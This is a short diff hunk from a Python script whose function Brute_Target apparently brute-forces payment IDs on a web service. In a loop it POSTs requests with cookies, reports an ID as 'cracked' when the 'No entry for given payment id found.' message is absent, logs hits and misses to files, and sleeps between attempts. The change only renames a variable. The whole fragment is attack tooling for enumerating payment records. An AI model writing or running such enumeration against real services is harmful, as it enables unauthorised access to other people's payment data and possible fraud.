@@ -105,10 +105,10 @@ def Brute_Target(url, id, seconds, read_path, output_path, pk_path, pk_pw, templ
         r = post(url, data=Data, cookies=Cookies)
         if ("200" in str(r)):
             if ("No entry for given payment id found." not in str(r.text)):
-                print (Colors.ORANGE+'[+]'+Colors.RESET+Colors.RED+f' {IDs} was cracked!'+Colors.RESET)
-                Write_File(output_path, IDs)
+                print (Colors.ORANGE+'[+]'+Colors.RESET+Colors.RED+f' {id} was cracked!'+Colors.RESET)
+                Write_File(output_path, id)
             else:
-                print (Colors.BLUE+"[-]"+Colors.RESET+f' {IDs} was not successful.')
-                Write_File(template_path, IDs)
+                print (Colors.BLUE+"[-]"+Colors.RESET+f' {id} was not successful.')
+                Write_File(template_path, id)
         else: print (str(r))
         sleep(seconds)
